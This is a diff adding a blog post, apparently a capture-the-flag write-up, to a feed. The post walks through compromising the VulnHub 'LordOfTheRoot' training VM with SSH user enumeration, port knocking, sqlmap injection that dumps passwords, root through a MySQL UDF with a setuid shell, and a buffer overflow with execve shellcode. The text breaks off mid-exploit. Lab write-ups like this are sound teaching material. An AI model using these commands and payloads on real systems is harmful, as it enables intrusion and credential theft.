@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-11T05:39:42-04:00</updated>
+  <updated>2017-06-15T14:41:03-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,830 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
+    <updated>2017-06-12T11:08:37-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
+    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>
+
+<!-- more -->
+
+
+<p>The port scan revealed only 1 open port:</p>
+
+<p><code>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
+</code></p>
+
+<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>
+
+<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>
+
+<p>```
+python 40136.py -h
+usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [&mdash;bytes BYTES]</p>
+
+<pre><code>            [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
+            host
+</code></pre>
+
+<p>positional arguments:
+  host                  Give SSH server address like ip:port or just by ip</p>
+
+<p>optional arguments:
+  -h, &mdash;help            show this help message and exit
+  -u USER, &mdash;user USER  Give a single user name
+  -U USERLIST, &mdash;userlist USERLIST</p>
+
+<pre><code>                    Give a file containing a list of users
+</code></pre>
+
+<p>  -e, &mdash;enumerated      Only show enumerated users
+  -s, &mdash;silent          Like -e, but just the user names will be written to</p>
+
+<pre><code>                    stdout (no banner, no anything)
+</code></pre>
+
+<p>  &mdash;bytes BYTES         Send so many BYTES to the SSH daemon as a password
+  &mdash;samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline</p>
+
+<pre><code>                    for authenticating non-existing users
+</code></pre>
+
+<p>  &mdash;factor FACTOR       Used to compute the upper timing boundary for user</p>
+
+<pre><code>                    enumeration
+</code></pre>
+
+<p>  &mdash;trials TRIALS       try to authenticate user X for TRIALS times and</p>
+
+<pre><code>                    compare the mean of auth timings against the timing
+                    boundary
+</code></pre>
+
+<p>```</p>
+
+<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>
+
+<p><img class="center" src="/images/pentest/lordoftheroot/smeagol.png" title="&lsquo;smeagol&rsquo; &lsquo;smeagol&rsquo;" ></p>
+
+<p>Ran the script with the smeagol username:</p>
+
+<p>```
+python 40136.py -u smeagol 192.168.217.136</p>
+
+<p>User name enumeration against SSH daemons affected by CVE-2016-6210
+Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>
+
+<p>[<em>] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
+[</em>] Getting baseline timing for authenticating non-existing users&hellip;&hellip;&hellip;&hellip;
+[<em>] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
+[</em>] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
+[<em>] Defining timing of x &lt; 0.0837603474867 as non-existing user.
+[</em>] Testing your users&hellip;
+[+] smeagol &ndash; timing: 0.425467
+```</p>
+
+<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:</p>
+
+<p>```
+ssh <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#115;&#x6d;&#101;&#x61;&#x67;&#111;&#108;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#49;&#55;&#x2e;&#x31;&#51;&#x36;">&#x73;&#x6d;&#x65;&#97;&#x67;&#x6f;&#x6c;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x32;&#x31;&#x37;&#46;&#x31;&#x33;&#x36;</a>
+The authenticity of host &lsquo;192.168.217.136 (192.168.217.136)&rsquo; can&rsquo;t be established.
+ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &lsquo;192.168.217.136&rsquo; (ECDSA) to the list of known hosts.</p>
+
+<pre><code>                                              .____    _____________________________
+                                              |    |   \_____  \__    ___/\______   \
+                                              |    |    /   |   \|    |    |       _/
+                                              |    |___/    |    \    |    |    |   \
+                                              |_______ \_______  /____|    |____|_  /
+                                                      \/       \/                 \/
+</code></pre>
+
+<p> <em><em><strong>  </strong>.                     <strong>     </strong></em></em><strong><em><strong><strong>      .</strong>                   .</strong></em> </strong><strong><strong><strong><strong><em>      </em></strong></strong></strong></strong><strong>       </strong>
+|    |/ <em>| </em><em><strong>   </strong><strong>   </strong></em><em> |  | <strong> _   </strong></em><strong>/</strong><em><em><strong>|</strong>| </em></em><strong>   </strong><strong>    </strong>| <em>/ _</em>    <strong><em>/</em></strong>   _   <strong><strong><em>/ </em></strong></strong>/  |<em>  </em><em><strong><strong><strong><strong><em>
+|      &lt;  /    \ /  _ _/ </em></strong>\|  |/ /  |    </strong>) _  </strong> \  |/ </strong> \ /    \  / <strong> |    |    | /  _ \   |    </strong>)</em> /    \   <strong>\/ </strong> _  <strong> \
+|    |  \|   |  (  &lt;_> )  _</strong>|    &lt;   |     \   |  | \/  \  <strong><em>/|   |  \/ /</em>/ |    |    |(  &lt;<em>> )  |        \   |  \  | \  </em></strong>/|  | \/
+|<em><em><strong>|</strong> _<strong>|  /_</strong></em>/ _<strong>  ></strong>|</em> \  _<strong>  /   |</strong>|  |<strong>|_</strong>  ><strong><em>|  /_</em></strong> |    |<em><strong><em>| _</em></strong>/  /</em><strong><strong><em>_  /</em></strong>|  /</strong>|  _<strong>  ></strong>|</p>
+
+<pre><code>    \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+</code></pre>
+
+<p>Easy as 1,2,3
+<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#115;&#109;&#x65;&#x61;&#103;&#111;&#x6c;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x31;&#55;&#46;&#x31;&#x33;&#x36;">&#x73;&#109;&#x65;&#x61;&#103;&#111;&#108;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#50;&#x31;&#x37;&#x2e;&#x31;&#x33;&#54;</a>&rsquo;s password:
+```</p>
+
+<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>
+
+<p>```
+nmap -r -p1,2,3 192.168.217.136</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-12 12:31 EDT
+Nmap scan report for 192.168.217.136
+Host is up (0.00065s latency).
+PORT  STATE    SERVICE
+1/tcp filtered tcpmux
+2/tcp filtered compressnet
+3/tcp filtered compressnet
+```</p>
+
+<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>
+
+<p><code>
+1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+</code></p>
+
+<p>I checked it out in the browser, and found this image:</p>
+
+<p><img class="center" src="/images/pentest/lordoftheroot/willdo.jpeg" title="&lsquo;mordor&rsquo; &lsquo;take the ring to mordor&rsquo;" ></p>
+
+<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>
+
+<p><img class="center" src="/images/pentest/lordoftheroot/hipster.jpg" title="&lsquo;hipster&rsquo; &lsquo;hipster&rsquo;" ></p>
+
+<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>
+
+<p>```</p>
+
+<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
+```
+
+I put the string into a [multipurpose online decoder](https://encoder.mattiasgeniar.be/index.php) and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!
+
+<img class="center" src="/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login">
+
+Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn't report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:
+
+``` 
+sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db
+```
+
+First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:
+
+``` 
+current database:    'Webapp'
+```
+
+Next, I dumped the discovered database:
+
+``` 
+sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
+[...]
+Database: Webapp
+Table: Users
+[5 entries]
++----+----------+------------------+
+| id | username | password         |
++----+----------+------------------+
+| 1  | frodo    | iwilltakethering |
+| 2  | smeagol  | MyPreciousR00t   |
+| 3  | aragorn  | AndMySword       |
+| 4  | legolas  | AndMyBow         |
+| 5  | gimli    | AndMyAxe         |
++----+----------+------------------+
+```
+
+Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :-) And I got in:
+
+``` 
+smeagol@LordOfTheRoot:~$ uname -a
+Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+```
+
+So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a [privilege escalation exploit](https://www.exploit-db.com/exploits/39166/) right away. I decided to save this approach for last, because the exploit wasn't known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.
+
+
+I downloaded my [linux_privcheck](https://github.com/chousensha/linux_privcheck) tool with <code>wget https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:
+
+``` 
+root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld
+```
+
+MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:
+
+``` 
+/SECRET/door2/file
+/SECRET/door1/file
+/SECRET/door3/file
+```
+
+The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let's take them in order!
+
+## Privilege escalation method #1 - via MySQL
+
+With MySQL running as root, we can use [a UDF and a setuid binary to gain a root shell](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/). At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>--users</code> and <code>--passwords</code>:
+
+``` 
+database management system users [5]:
+[*] 'debian-sys-maint'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'::1'
+[*] 'root'@'localhost'
+[*] 'root'@'lordoftheroot'
+
+database management system users password hashes:
+[*] debian-sys-maint [1]:
+    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
+[*] root [1]:
+    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
+```
+
+I used an online cracker for the root hash, and the cracked password was *darkshadow*. Then I connected to the MySQL database:
+
+``` 
+smeagol@LordOfTheRoot:~$ mysql -u root -p 
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 1829
+Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+
+
+Next, I followed the steps of the [infamoussyn article](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/), which are really well explained. UDF files need to be [locally compiled and installed on the server host](https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html), and a special directory is required for that..
+
+- Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:
+
+``` 
+mysql> show variables like "plugin_dir";
++---------------+------------------------+
+| Variable_name | Value                  |
++---------------+------------------------+
+| plugin_dir    | /usr/lib/mysql/plugin/ |
++---------------+------------------------+
+1 row in set (0.00 sec)
+```
+
+The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we'll put our UDF object files.
+
+- Now it's time to compile the object file. The exploit that allows privilege escalation is called[raptor_udf2.c](https://www.exploit-db.com/exploits/1518/). I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:
+
+``` 
+gcc -g -c raptor_udf2.c
+```
+
+If you are lost in the myriad of GCC options from its manpage, there is a cool page offering [options summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>. 
+
+- Next, you create a shared library and link it:
+
+``` 
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+If you copy from the source code, you have to change the 1 in *-W1* to a lowercase l, otherwise you get an error. Here's a [good resource](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.
+
+- Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:
+
+``` 
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+```
+
+Create table:
+
+``` 
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.03 sec)
+```
+
+Load your .so file:
+
+``` 
+mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
+Query OK, 1 row affected (0.01 sec)
+```
+
+- Copy the .so file to the plugin directory:
+
+``` 
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+Query OK, 1 row affected (0.05 sec)
+```
+
+- Now you can create the UDF:
+
+``` 
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+```
+
+- Confirm that it works:
+
+``` 
+mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
++------------------------------------------------------------+
+| do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out') |
++------------------------------------------------------------+
+|                                                          0 |
++------------------------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql> \! cat /tmp/out
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Note that you can use *\\!* to run commands from within the MySQL shell.
+
+- Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+I used MySQL to compile it:
+
+``` 
+mysql> select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
++-----------------------------------------------------+
+| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
++-----------------------------------------------------+
+|                                                   0 |
++-----------------------------------------------------+
+1 row in set (0.15 sec)
+```
+
+Now set the SUID bit:
+
+``` 
+mysql> select do_system("chmod u+s /tmp/ring");
++----------------------------------+
+| do_system("chmod u+s /tmp/ring") |
++----------------------------------+
+|                                0 |
++----------------------------------+
+1 row in set (0.01 sec)
+```
+
+I looked inside /tmp for confirmation:
+
+``` 
+smeagol@LordOfTheRoot:~$ ls -l /tmp/
+total 12
+-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
+-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring
+```
+
+Lastly, I dropped to a shell with <code>\\! sh</code>, and ran the newly created binary:
+
+``` 
+$ /tmp/ring
+root@LordOfTheRoot:~# cat /root/Flag.txt 
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf
+```
+
+Inside root's directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..
+
+## Privilege escalation method #2 - Binary exploitation
+
+So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:
+
+``` 
+smeagol@LordOfTheRoot:/SECRET$ ls -la *
+door1:
+total 16
+drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
+drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
+-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
+
+door2:
+total 16
+drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
+drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
+-rwsr-xr-x 1 root root 5150 Sep 22  2015 file
+
+door3:
+total 16
+drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
+drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
+-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
+```
+
+Let's see each of them:
+
+``` 
+door1/file 
+Syntax: door1/file <input string>
+```
+
+I went through them, and determined that the vulnerable binary is the one with size 5150.
+
+``` 
+./file $(python -c 'print "A" * 200')
+Segmentation fault (core dumped)
+```
+
+I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it's GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or [Python Exploit Development Assistance for GDB](https://github.com/longld/peda), which adds cool features and colorizes the display. So I figured I'd give it a try, and downloaded it to the target and installed it:
+
+``` 
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+```
+
+If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:
+
+``` 
+gdb-peda$ peda help
+PEDA - Python Exploit Development Assistance for GDB
+For latest update, check peda project page: https://github.com/longld/peda/
+List of "peda" subcommands, type the subcommand to invoke it:
+aslr -- Show/set ASLR setting of GDB
+asmsearch -- Search for ASM instructions in memory
+assemble -- On the fly assemble and execute instructions using NASM
+checksec -- Check for various security options of binary
+cmpmem -- Compare content of a memory region with a file
+context -- Display various information of current execution context
+context_code -- Display nearby disassembly at $PC of current execution context
+context_register -- Display register information of current execution context
+context_stack -- Display stack of current execution context
+crashdump -- Display crashdump info and save to file
+deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
+distance -- Calculate distance between two addresses
+dumpargs -- Display arguments passed to a function when stopped at a call instruction
+dumpmem -- Dump content of a memory region to raw binary file
+dumprop -- Dump all ROP gadgets in specific memory range
+eflags -- Display/set/clear/toggle value of eflags register
+elfheader -- Get headers information from debugged ELF file
+elfsymbol -- Get non-debugging symbol information from an ELF file
+gennop -- Generate abitrary length NOP sled using given characters
+getfile -- Get exec filename of current debugged process
+getpid -- Get PID of current debugged process
+goto -- Continue execution at an address
+help -- Print the usage manual for PEDA commands
+hexdump -- Display hex/ascii dump of data in memory
+hexprint -- Display hexified of data in memory
+jmpcall -- Search for JMP/CALL instructions in memory
+loadmem -- Load contents of a raw binary file to memory
+lookup -- Search for all addresses/references to addresses which belong to a memory range
+nearpc -- Disassemble instructions nearby current PC or given address
+nextcall -- Step until next 'call' instruction in specific memory range
+nextjmp -- Step until next 'j*' instruction in specific memory range
+nxtest -- Perform real NX test to see if it is enabled/supported by OS
+patch -- Patch memory start at an address with string/hexstring/int
+pattern -- Generate, search, or write a cyclic pattern to memory
+pattern_arg -- Set argument list with cyclic pattern
+pattern_create -- Generate a cyclic pattern
+pattern_env -- Set environment variable with a cyclic pattern
+pattern_offset -- Search for offset of a value in cyclic pattern
+pattern_patch -- Write a cyclic pattern to memory
+pattern_search -- Search a cyclic pattern in registers and memory
+payload -- Generate various type of ROP payload using ret2plt
+pdisass -- Format output of gdb disassemble command with colors
+pltbreak -- Set breakpoint at PLT functions match name regex
+procinfo -- Display various info from /proc/pid/
+profile -- Simple profiling to count executed instructions in the program
+pyhelp -- Wrapper for python built-in help
+readelf -- Get headers information from an ELF file
+refsearch -- Search for all references to a value in memory ranges
+reload -- Reload PEDA sources, keep current options untouch
+ropgadget -- Get common ROP gadgets of binary or library
+ropsearch -- Search for ROP gadgets in memory
+searchmem -- Search for a pattern in memory; support regex search
+session -- Save/restore a working gdb session to file as a script
+set -- Set various PEDA options and other settings
+sgrep -- Search for full strings contain the given pattern
+shellcode -- Generate or download common shellcodes.
+show -- Show various PEDA options and other settings
+skeleton -- Generate python exploit code template
+skipi -- Skip execution of next count instructions
+snapshot -- Save/restore process's snapshot to/from file
+start -- Start debugged program and stop at most convenient entry
+stepuntil -- Step until a desired instruction in specific memory range
+strings -- Display printable strings in memory
+substr -- Search for substrings of a given string/number in memory
+telescope -- Display memory content at an address with smart dereferences
+tracecall -- Trace function calls made by the program
+traceinst -- Trace specific instructions executed by the program
+unptrace -- Disable anti-ptrace detection
+utils -- Miscelaneous utilities from utils module
+vmmap -- Get virtual mapping address ranges of section(s) in debugged process
+waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
+xinfo -- Display detail information of address/registers
+xormem -- XOR a memory region with a key
+xprint -- Extra support to GDB's print command
+xrefs -- Search for all call/data access references to a function/variable
+xuntil -- Continue execution until an address or function
+
+Type "help" followed by subcommand for full documentation.
+```
+
+It's time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:
+
+``` 
+gdb-peda$ peda help pattern
+Generate, search, or write a cyclic pattern to memory
+Set "pattern" option for basic/extended pattern type
+Usage:
+    pattern create size [file]
+    pattern offset value
+    pattern search
+    pattern patch address size
+    pattern arg size1 [size2,offset2]
+    pattern env size[,offset]
+gdb-peda$ pattern create 200 test
+Writing pattern of 200 chars to filename "test"
+```
+
+<img class="center" src="/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda">
+
+I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:
+
+``` 
+gdb-peda$ pattern search 0x57414174
+Registers contain pattern buffer:
+EBP+0 found at offset: 167
+EIP+0 found at offset: 171
+Registers point to pattern buffer:
+[ESP] -->
+
+
+<p> offset 175 &ndash; size ~25
+Pattern buffer found at:
+0xbffff571 : offset    0 &ndash; size  200 ($sp + -0xaf [-44 dwords])
+0xbffff7f8 : offset    0 &ndash; size  200 ($sp + 0x1d8 [118 dwords])
+References to pattern buffer found at:
+0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
+0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
+0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
+0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])
+```</p>
+
+<p>The reported offset is 171. Verified it really quick:</p>
+
+<p><code>
+gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
+[...]
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff640 ("CCCC")
+EIP: 0x42424242 ('BBBB')
+</code></p>
+
+<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>
+
+<p>```
+gdb-peda$ peda help shellcode
+Generate or download common shellcodes.
+Usage:</p>
+
+<pre><code>shellcode generate [arch/]platform type [port] [host]
+shellcode search keyword (use % for any character wildcard)
+shellcode display shellcodeId (shellcodeId as appears in search results)
+shellcode zsc [generate customize shellcode]
+
+For generate option:
+    default port for bindport shellcode: 16706 (0x4142)
+    default host/port for connect back shellcode: 127.127.127.127/16706
+    supported arch: x86
+</code></pre>
+
+<p>```</p>
+
+<p>Next I searched for some execve shellcode, and settled for the below:</p>
+
+<p><code>
+[841]   Linux/x86 - Tiny Execve sh Shellcode - 21 bytes
+</code></p>
+
+<p>Let&rsquo;s see what I got here:</p>
+
+<p>```
+gdb-peda$ shellcode display 841
+Connecting to shell-storm.org&hellip;</p>
+
+<p>/*</p>
+
+<p> Tiny Execve sh Shellcode &ndash; C Language &ndash; Linux/x86
+ Copyright &copy; 2013 Geyslan G. Bem, Hacking bits</p>
+
+<p>   <a href="http://hackingbits.com">http://hackingbits.com</a>
+   <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#103;&#101;&#x79;&#115;&#x6c;&#x61;&#110;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;">&#103;&#x65;&#x79;&#x73;&#108;&#97;&#x6e;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a></p>
+
+<p> This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ (at your option) any later version.</p>
+
+<p> This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.</p>
+
+<p> You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a></p>
+
+<p>*/</p>
+
+<p>/*</p>
+
+<p>   tiny_execve_sh_shellcode</p>
+
+<ul>
+<li>21 bytes</li>
+<li>null-free</li>
+</ul>
+
+
+<p>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</p>
+
+<p>   Testing
+   # ./tiny_execve_sh_shellcode</p>
+
+<p>*/</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<p>unsigned char shellcode[] = \</p>
+
+<p>&ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f&rdquo;
+&ldquo;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd&rdquo;
+&ldquo;\x80&rdquo;;</p>
+
+<p>main ()
+{</p>
+
+<pre><code>    // When contains null bytes, printf will show a wrong shellcode length.
+
+printf("Shellcode Length:  %d\n", strlen(shellcode));
+
+// Pollutes all registers ensuring that the shellcode runs in any circumstance.
+
+__asm__ ("movl $0xffffffff, %eax\n\t"
+     "movl %eax, %ebx\n\t"
+     "movl %eax, %ecx\n\t"
+     "movl %eax, %edx\n\t"
+     "movl %eax, %esi\n\t"
+     "movl %eax, %edi\n\t"
+     "movl %eax, %ebp\n\t"
+
+     // Calling the shellcode
+     "call shellcode");
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>
+
+<p>```
+gdb-peda$ context stack</p>
+
